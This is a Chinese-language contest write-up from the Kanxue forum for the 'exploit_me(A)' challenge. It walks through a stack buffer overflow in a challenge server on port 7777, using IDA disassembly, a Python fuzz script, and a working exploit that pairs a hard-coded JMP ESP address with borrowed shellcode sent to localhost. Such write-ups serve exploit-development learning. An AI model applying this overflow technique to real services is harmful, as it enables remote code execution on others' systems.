
# 我的 exploit\_me(A)答案

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-361.htm`](https://www.pediy.com/kssd/pediy09/pediy09-361.htm)

> 提交者看雪 ID：`xfmaple`

> 职业：（学生、程序员、安全专家、黑客技术爱好者、其他？）

> 黑客技术爱好者

## PE 分析

程序启动之后，会监听本地的 `7777` 端口，用来接受用户的输入，然后显示在屏幕上。

## 漏洞描述

程序在接受用户的输入的数据时候，没有进行边界的检查，导致用户输入过长的数据时，在 `strcpy` 时产生溢出

用 `IDA` 加载分析

> 因为是在处理接受输入的数据的时候出现的问题，因为我们可以直接找到 `recv` 函数的地方

### 代码

```
.text:00401200	loc_401200:								; CODE XREF: _main+1AA j
.text:00401200									; _main+1C9 j
.text:00401200				mov		ecx, 80h
.text:00401205				xor		eax, eax
.text:00401207				lea		edi, [esp+34h]
.text:0040120B				push	eax				; flags
.text:0040120C				rep stosd
.text:0040120E				lea		ecx, [esp+38h]
.text:00401212				push	200h			; len    //接受的长度
.text:00401217				push	ecx				; buf    //缓冲区 80h
.text:00401218				push	ebx				; s
.text:00401219				call	ds:recv			//接受数据
.text:0040121F				mov		esi, eax
.text:00401221				test	esi, esi			//是否有数据受到
.text:00401223				jge		short loc_40124B	//如果有数据接受到，跳转
.text:00401225				push	offset aReadingStreamM	; "reading stream message erro!"
.text:0040122A				mov		ecx, offset dword_409A68
.text:0040122F				call	??6ostream@@QAEAAV0@PBD@Z	; ostream::operator<<(char const *)
.text:00401234				push	offset sub_4012D0
.text:00401239				push	0Ah
.text:0040123B				mov		ecx, eax
.text:0040123D				call	??6ostream@@QAEAAV0@E@Z	; ostream::operator<<(uchar)
.text:00401242				mov		ecx, eax
.text:00401244				call	sub_4012B0
.text:00401249				xor		esi, esi

如上面分析，程序在接受到数据以后会跳转到 short loc_40124B 进行处理，继续跟进
.text:0040124B loc_40124B:							; CODE XREF: _main+173 j
.text:0040124B			lea		edx, [esp+34h]		//把 edx 指向接受到的数据
.text:0040124F			push	edx
.text:00401250			call	sub_401000			//处理，跟进
.text:00401255			add		esp, 4
.text:00401258			test	esi, esi
.text:0040125A			jnz		short loc_401200
.text:0040125C			push	ebx				; s
.text:0040125D			call	ds:closesocket
.text:00401263			lea		eax, [esp+3C4h+name]
.text:00401267			lea		ecx, [esp+3C4h+addr.sa_data+2]
.text:0040126B			push	eax				; addrlen
.text:0040126C			push	ecx				; addr
.text:0040126D			push	ebp				; s
.text:0040126E			call	ds:accept
.text:00401274			mov		ebx, eax
.text:00401276			cmp		ebx, 0FFFFFFFFh
.text:00401279			jnz		short loc_401200
.text:0040127B			pop		edi
.text:0040127C			pop		esi

跟进出：
.text:00401000 sub_401000	proc near				; CODE XREF: _main+1A0 p
.text:00401000
.text:00401000 var_C8			= byte ptr -0C8h
.text:00401000 arg_0			= dword ptr  4
.text:00401000
.text:00401000			sub		esp, 0C8h			//分配内存大小 0c8h = 200 字节，关键
.text:00401006			or		ecx, 0FFFFFFFFh		//
.text:00401009			xor		eax, eax			//eax 清零
.text:0040100B			lea		edx, [esp+0C8h+var_C8]		//指向分配空间的起始地址
.text:0040100F			push	esi
.text:00401010			push	edi		//保存 esi,edi
.text:00401011			mov		edi, [esp+0D0h+arg_0]		//edi 指向接受的数据
.text:00401018			push	offset asc_40904C ; "*****************"
.text:0040101D			repne scasb
.text:0040101F			not		ecx
.text:00401021			sub		edi, ecx
.text:00401023			mov		eax, ecx
.text:00401025			mov		esi, edi
.text:00401027			mov		edi, edx
.text:00401029			shr		ecx, 2
.text:0040102C			rep movsd		//把源数据 copy 到目标区域,这里就是 strcpy，溢出点。我们只分配了 200 空间的大小，也就是说超过 200 个字符就会溢出。
.text:0040102E			mov		ecx, eax
.text:00401030			and		ecx, 3
.text:00401033			rep movsb
.text:00401035			mov		ecx, offset dword_409A68
.text:0040103A			call	??6ostream@@QAEAAV0@PBD@Z	; ostream::operator<<(char const *)
.text:0040103F			push	offset sub_4012D0
.text:00401044			push	0Ah
.text:00401046			mov		ecx, eax
.text:00401048			call	??6ostream@@QAEAAV0@E@Z	; ostream::operator<<(uchar)
.text:0040104D			mov		ecx, eax
.text:0040104F			call	sub_4012B0
.text:00401054			push	offset aReceived	; "received:"
.text:00401059			mov		ecx, offset dword_409A68
.text:0040105E			call	??6ostream@@QAEAAV0@PBD@Z	; ostream::operator<<(char const *)
.text:00401063			push	offset sub_4012D0
.text:00401068			push	0Ah
.text:0040106A			mov		ecx, eax
.text:0040106C			call	??6ostream@@QAEAAV0@E@Z	; ostream::operator<<(uchar)
.text:00401071			mov		ecx, eax
.text:00401073			call	sub_4012B0
.text:00401078			lea		ecx, [esp+0D0h+var_C8]
.text:0040107C			push	ecx
.text:0040107D			mov		ecx, offset dword_409A68
.text:00401082			call	??6ostream@@QAEAAV0@PBD@Z	; ostream::operator<<(char const *)
.text:00401087			push	offset sub_4012D0
.text:0040108C			push	0Ah
.text:0040108E			mov		ecx, eax
.text:00401090			call	??6ostream@@QAEAAV0@E@Z	; ostream::operator<<(uchar)
.text:00401095			mov		ecx, eax
.text:00401097			call	sub_4012B0
.text:0040109C			pop		edi
.text:0040109D			pop		esi
.text:0040109E			add		esp, 0C8h
.text:004010A4			retn
.text:004010A4 sub_401000	endp
```

漏洞分析结束。

## shellcode 描述

请注明 shellcode 来源：原创，修改，引用。

原创请给出开发说明

修改请给出修改说明，并注明出处，附加被引用代码

引用请给出功能描述，并注明出处，附加被引用代码

根据上面的程序分析，在我们发送超过 `200` 个字符就产生溢出，现用 `python` 写个简单的测试程序测试一下，我们的分析是否正确

### 代码

```
from socket import *

if __name__ == '__main__':
  fuzzstrings ='A' * 200 + 'B'*4 + 'C' * 4
  sockobj = socket (AF_INET, SOCK_STREAM)
  sockobj.connect(('127.0.0.1', 7777));
  sockobj.send(fuzzstrings)
  sockobj.close()
```

用 `OD` 加载程序，运行

覆盖了 `EIP` 为 `42424242`，ASCII 就是 `BBBB`，说明我们的分析是正确的。

在 failwest 几期教程，已经教了我们一些寻找 `JMP ESP` 的跳转地址的方法。

我这里就用一个中文版，NT/XP/2003 通用跳转地址 `7ffa54cd` （当然你可以找别的，这里偷懒一下）也就是说需要把 `B` * 4 换成 `0x7ffa54cd`,到这里第一个跳转解决了。

`SHELLCODE` 的编写，其实也一门很有技巧的学科，我这里还直接用 failwest 在案例中给出的 `SHELLCODE`,等着 failwest 书来教我怎么更好，更能适合环境的 `SHELLCODE`.:)

如果要自己开发的话，应该还要避免 `\0` 出现，否则会在 `strcpy` 中截断

结合上面的分析，我们可以给出如下代码

### 代码

```
```



```python
from socket import *
if __name__ == '__main__':
  shellcode = 'A' * 200 + "\xcd\x54\xfa\x7f" 
  shellcode=shellcode+ "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" + \
      "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" + \
      "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" + \
      "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" + \
      "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" + \
      "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" + \
      "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" + \
      "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" + \
      "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" + \
      "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" + \
      "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
  sockobj = socket(AF_INET, SOCK_STREAM)
  sockobj.connect(('127.0.0.1', 7777));
  sockobj.send(shellcode)
  sockobj.close()
```

exploit 运行成功运行了

## 稳定性与通用性论证

这里用 `failwest`，通过 `TEB`/`PEB` 的方式，动态定位 `DLL`,`API` 或得，在加上我们的中文通用跳转地址，所以能够很好的在中文版的 `NT`/`XP`/`2003` 中稳定运行。具体可以看

`http://bbs.pediy.com/showthread.php?t=57128`

《完全分析 `failwest` Sir's Shellcode》此文的注释已经非常详细了。

## 创新性论证（可选）

1. 思路，拿到赛题的时候，看到 A 题中的 说明，是一个服务器程序，溢出的基本原因是由于人工或者外界的输入数据，处理不当引起的。因为是赛题，第一给我感觉就是在接受的地方有问题，运行程序以后，发现多了个 `7777` 的端口。然后马上用 `nc` `127.0.0.1` `7777` < `1.txt` 的方式进行测试，在 `1.txt` 可以放入 N 个 A, `ctrl+c`, `ctrl+v` 的方法先来简单做猜想，用 `NC` 还是不错的主意。事实也确实证明了我的想法。

2. 在分析的过程中，用 `IDA` 简单的看了一下，基本就是一个用 `C++` 写的创建服务的过程，`IDA` 也给出了很多注释。也像开始些的那样，可以推测出是在 `recv` 以后，处理数据的地方出了问题，然后马上定位到那个地方，也可以用 `OD` 启动，在 `recv` 下断点，来单步跟踪调试，直到找到出问题的地方。

自己有个很笨的调试方法，就是在找到溢出点附近的适合，我就先 `F8` 单步步过调试，如果发现经过某个 `call` 以后，溢出了。那就在 `call` 中下断点，然后 `ctrl+f2`，继续重复步骤。虽然可能需要重复很多次，但一定能够找到，对于经验缺少的我们这些才菜鸟来说，还是行的通的。

`4dd466d0e1e0cc123afbe504da2462ca`
